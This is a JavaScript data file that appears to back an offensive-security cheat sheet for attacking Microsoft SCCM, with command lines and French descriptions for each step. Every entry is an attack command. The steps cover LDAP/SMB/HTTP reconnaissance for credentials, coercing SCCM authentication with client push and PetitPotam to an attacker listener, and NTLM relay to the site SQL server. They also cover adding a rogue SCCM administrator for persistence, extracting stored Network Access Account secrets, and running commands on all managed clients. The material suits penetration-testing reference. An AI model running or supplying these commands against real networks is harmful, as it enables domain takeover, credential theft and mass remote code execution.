export const SCCM_DATA = [
  {
    name: 'Recon & Credentials Hunting',
    nodes: [
      { 
        label: 'Find SCCM Sites', 
        cmd: 'sccmhunter.py find -u <user> -p <pass> -d <domain> -dc-ip <dc_ip>', 
        leadsTo: 'SCCM Servers',
        description: 'Découvre les serveurs SCCM (Management Points, Distribution Points) via LDAP et enregistre les informations.'
      },
      { 
        label: 'SMB Share Recon', 
        cmd: 'sccmhunter.py smb -u <user> -p <pass> -d <domain> -dc-ip <dc_ip>', 
        leadsTo: 'NAA Credentials',
        description: 'Scanne les partages SMB des serveurs SCCM à la recherche de fichiers de configuration contenant des identifiants (NAA).'
      },
      { 
        label: 'HTTP Recon', 
        cmd: 'sccmhunter.py http -u <user> -p <pass> -d <domain> -dc-ip <dc_ip>', 
        leadsTo: 'Client Push Settings',
        description: 'Interroge les services HTTP des points de gestion pour identifier si l\'inscription automatique est activée.'
      }
    ]
  },
  {
    name: 'Privilege Escalation (Client Push)',
    nodes: [
      { 
        label: 'SharpSCCM Invoke-ClientPush', 
        cmd: 'SharpSCCM.exe invoke client-push -m <mp_server> -t <target_computer>', 
        leadsTo: 'Admin on Target',
        description: 'Force le serveur SCCM à tenter d\'installer le client sur une cible, déclenchant une connexion SMB entrante (Relayable).'
      },
      { 
        label: 'Coerce & Relay (PetitPotam)', 
        cmd: 'petitpotam.py <sccm_server> <attacker_listener>', 
        leadsTo: 'Admin via Relay',
        description: 'Force le serveur SCCM à s\'authentifier sur l\'attaquant, puis relaye cette authentification vers une cible où le SCCM est Admin local.'
      }
    ]
  },
  {
    name: 'Takeover (Site Server)',
    nodes: [
      { 
        label: 'MSSQL Relay', 
        cmd: 'ntlmrelayx.py -t mssql://<sql_server> -smb2support --socks', 
        leadsTo: 'SQL Admin',
        description: 'Relaye une authentification (ex: Client Push Account) vers le serveur SQL du site SCCM pour obtenir les droits sysadmin.'
      },
      { 
        label: 'SCCM Admin Abuse', 
        cmd: 'sccmhunter.py admin -u <user> -p <pass> -ip <mp_ip> -action add_admin -target <attacker_user>', 
        leadsTo: 'Full Site Control',
        description: 'Si l\'utilisateur compromis est administrateur SCCM, ajoute un nouvel administrateur pour persister.'
      }
    ]
  },
  {
    name: 'Post-Exploitation (Creds & Execute)',
    nodes: [
      { 
        label: 'Extract Secrets (SharpSCCM)', 
        cmd: 'SharpSCCM.exe get secrets -m <mp_server>', 
        leadsTo: 'NAA / Collection Creds',
        description: 'Récupère les secrets chiffrés (Network Access Accounts, Task Sequence Passwords) stockés dans la base SCCM.'
      },
      { 
        label: 'Execute Command (CMPivot)', 
        cmd: 'SharpSCCM.exe exec -d <device_collection> -c "cmd.exe /c whoami"', 
        leadsTo: 'RCE on Clients',
        description: 'Utilise CMPivot ou les scripts SCCM pour exécuter des commandes sur tous les clients du parc géré.'
      }
    ]
  }
];